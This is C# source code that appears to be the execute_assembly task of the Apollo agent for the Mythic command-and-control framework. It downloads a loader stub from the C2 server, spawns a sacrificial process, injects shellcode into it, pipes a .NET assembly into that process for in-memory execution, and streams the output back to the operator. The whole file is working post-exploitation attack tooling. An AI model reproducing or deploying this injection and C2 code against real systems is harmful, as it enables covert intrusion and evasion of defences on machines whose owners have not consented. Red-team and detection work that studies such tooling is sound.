#define COMMAND_NAME_UPPER

#if DEBUG
#define EXECUTE_ASSEMBLY
#endif

#if EXECUTE_ASSEMBLY

using System;
using System.Linq;
using System.Text;
using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using System.Runtime.Serialization;
using ApolloInterop.Serializers;
using System.Threading;
using System.Collections.Concurrent;
using System.IO.Pipes;
using ApolloInterop.Structs.ApolloStructs;
using ApolloInterop.Classes.Core;
using ApolloInterop.Classes.Collections;
using ApolloInterop.Utils;

namespace Tasks
{

    internal class ExecuteAssemblyException : Exception
    {
        public ExecuteAssemblyException()
        {
        }

        public ExecuteAssemblyException(string message) : base(message)
        {
        }

        public ExecuteAssemblyException(string message, Exception inner)
            : base (message, inner)
        {
        }
    }

    public class execute_assembly : Tasking
    {
        [DataContract]
        internal struct ExecuteAssemblyParameters
        {
            [DataMember(Name = "pipe_name")]
            public string PipeName;
            [DataMember(Name = "assembly_name")]
            public string AssemblyName;
            [DataMember(Name = "assembly_arguments")]
            public string AssemblyArguments;
            [DataMember(Name = "loader_stub_id")]
            public string LoaderStubId;
        }

        private AutoResetEvent _senderEvent = new AutoResetEvent(false);
        private ConcurrentQueue<byte[]> _senderQueue = new ConcurrentQueue<byte[]>();
        private JsonSerializer _serializer = new JsonSerializer();
        private AutoResetEvent _complete = new AutoResetEvent(false);
        private Action<object> _sendAction;

        private Action<object> _flushMessages;
        private ThreadSafeList<string> _assemblyOutput = new ThreadSafeList<string>();
        private bool _completed = false;
        private System.Threading.Tasks.Task flushTask;

        public execute_assembly(IAgent agent, MythicTask mythicTask) : base(agent, mythicTask)
        {
            _sendAction = (object p) =>
            {
                PipeStream ps = (PipeStream)p;
                while (ps.IsConnected && !_cancellationToken.IsCancellationRequested)
                {
                    WaitHandle.WaitAny(new WaitHandle[]
                    {
                    _senderEvent,
                    _cancellationToken.Token.WaitHandle
                    });
                    if (!_cancellationToken.IsCancellationRequested && ps.IsConnected && _senderQueue.TryDequeue(out byte[] result))
                    {
                        try
                        {
                            ps.BeginWrite(result, 0, result.Length, OnAsyncMessageSent, p);
                        }
                        catch
                        {
                            ps.Close();
                            _complete.Set();
                            return;
                        }

                    } else if (!ps.IsConnected)
                    {
                        ps.Close();
                        _complete.Set();
                        return;
                    }
                }
                ps.Close();
                _complete.Set();
            };

            _flushMessages = (object p) =>
            {
                string output = "";
                while (!_cancellationToken.IsCancellationRequested && !_completed)
                {
                    WaitHandle.WaitAny(new WaitHandle[]
                    {
                        _complete,
                        _cancellationToken.Token.WaitHandle
                    }, 2000);
                    output = string.Join("", _assemblyOutput.Flush());
                    if (!string.IsNullOrEmpty(output))
                    {
                        _agent.GetTaskManager().AddTaskResponseToQueue(
                            CreateTaskResponse(
                                output,
                                false,
                                ""));
                    }
                }
                while (true)
                {
                    System.Threading.Tasks.Task.Delay(1000).Wait(); // wait 1s
                    output = string.Join("", _assemblyOutput.Flush());
                    if (!string.IsNullOrEmpty(output))
                    {
                        _agent.GetTaskManager().AddTaskResponseToQueue(
                            CreateTaskResponse(
                                output,
                                false,
                                ""));
                    } else
                    {
                        DebugHelp.DebugWriteLine($"no longer collecting output");
                        return;
                    }
                }

            };
        }

        public override void Kill()
        {
            _completed = true;
            _complete.Set();
            flushTask.Wait();
            _cancellationToken.Cancel();

        }

        public override void Start()
        {
            MythicTaskResponse resp;
            Process? proc = null;
            try
            {
                ExecuteAssemblyParameters parameters = _jsonSerializer.Deserialize<ExecuteAssemblyParameters>(_data.Parameters);
                if (string.IsNullOrEmpty(parameters.LoaderStubId) ||
                    string.IsNullOrEmpty(parameters.AssemblyName) ||
                    string.IsNullOrEmpty(parameters.PipeName))
                {
                    throw new ExecuteAssemblyException($"One or more required arguments was not provided.");
                }

                if (!_agent.GetFileManager().GetFileFromStore(parameters.AssemblyName, out byte[] assemblyBytes))
                {
                    throw new ExecuteAssemblyException($"'{parameters.AssemblyName}' is not loaded (have you registered it?");
                }

                if (!_agent.GetFileManager().GetFile(_cancellationToken.Token, _data.ID, parameters.LoaderStubId, out byte[] exeAsmPic))
                {
                    throw new ExecuteAssemblyException($"Failed to download assembly loader stub (with id: {parameters.LoaderStubId})");
                }

                ApplicationStartupInfo info = _agent.GetProcessManager().GetStartupInfo(IntPtr.Size == 8);
                proc = _agent.GetProcessManager().NewProcess(info.Application, info.Arguments, true);

                try
                {
                    if (!proc.Start())
                    {
                        throw new ExecuteAssemblyException("process not started.");
                    }
                }
                catch (Exception e)
                {
                    throw new ExecuteAssemblyException($"Failed to start '{info.Application}' sacrificial process: {e.Message}");
                }

                _agent.GetTaskManager()
                    .AddTaskResponseToQueue(
                        CreateTaskResponse(
                            "",
                            false,
                            "",
                            new IMythicMessage[]
                            {
                                Artifact.ProcessCreate((int) proc.PID, info.Application, info.Arguments)
                            }
                        )
                    );

                if (!proc.Inject(exeAsmPic))
                {
                    throw new ExecuteAssemblyException($"Failed to inject assembly loader into sacrificial process {info.Application}.");
                }

                _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
                    "",
                    false,
                    "",
                    new IMythicMessage[]
                    {
                        Artifact.ProcessInject((int) proc.PID,
                            _agent.GetInjectionManager().GetCurrentTechnique().Name)
                    }));

                IPCCommandArguments cmdargs = new IPCCommandArguments
                {
                    ByteData = assemblyBytes,
                    StringData = string.IsNullOrEmpty(parameters.AssemblyArguments)
                        ? ""
                        : parameters.AssemblyArguments,
                };

                AsyncNamedPipeClient client = new AsyncNamedPipeClient("127.0.0.1", parameters.PipeName);
                client.ConnectionEstablished += Client_ConnectionEstablished;
                client.MessageReceived += Client_MessageReceived;
                client.Disconnect += Client_Disconnect;

                if (!client.Connect(10000))
                {
                    throw new ExecuteAssemblyException($"Injected assembly into sacrificial process: {info.Application}.\n Failed to connect to named pipe.");
                }

                IPCChunkedData[] chunks = _serializer.SerializeIPCMessage(cmdargs);
                foreach (IPCChunkedData chunk in chunks)
                {
                    _senderQueue.Enqueue(Encoding.UTF8.GetBytes(_serializer.Serialize(chunk)));
                }

                _senderEvent.Set();
                WaitHandle.WaitAny(new WaitHandle[]
                {
                    _cancellationToken.Token.WaitHandle
                });

                resp = CreateTaskResponse("", true, "completed");
            }
            catch (ExecuteAssemblyException ex)
            {
                resp = CreateTaskResponse($"Error executing assembly\n\n{ex.Message}", true, "error");
            }
            catch (Exception ex)
            {
                resp = CreateTaskResponse($"Unexpected error: {ex.Message}\n\n{ex.StackTrace}", true, "error");
            }

            if (proc != null && !proc.HasExited)
            {
                proc.Kill();
                resp.Artifacts = [Artifact.ProcessKill((int)proc.PID)];
            }

            _agent.GetTaskManager().AddTaskResponseToQueue(resp);
        }

        private void Client_Disconnect(object sender, NamedPipeMessageArgs e)
        {
            _completed = true;
            _complete.Set();
            flushTask.Wait();
            e.Pipe.Close();
            _cancellationToken.Cancel();

        }

        private void Client_ConnectionEstablished(object sender, NamedPipeMessageArgs e)
        {
            System.Threading.Tasks.Task.Factory.StartNew(_sendAction, e.Pipe, _cancellationToken.Token);
            flushTask = System.Threading.Tasks.Task.Factory.StartNew(_flushMessages, _cancellationToken.Token);
        }

        public void OnAsyncMessageSent(IAsyncResult result)
        {
            PipeStream pipe = (PipeStream)result.AsyncState;
            // Potentially delete this since theoretically the sender Task does everything
            if (pipe.IsConnected && !_cancellationToken.IsCancellationRequested && _senderQueue.TryDequeue(out byte[] data))
            {
                try
                {
                    pipe.EndWrite(result);
                    pipe.BeginWrite(data, 0, data.Length, OnAsyncMessageSent, pipe);
                }
                catch
                {

                }

            }
        }

        private void Client_MessageReceived(object sender, NamedPipeMessageArgs e)
        {
            IPCData d = e.Data;
            string msg = Encoding.UTF8.GetString(d.Data.Take(d.DataLength).ToArray());
            DebugHelp.DebugWriteLine($"adding data to output");
            _assemblyOutput.Add(msg);
        }
    }
}
#endif
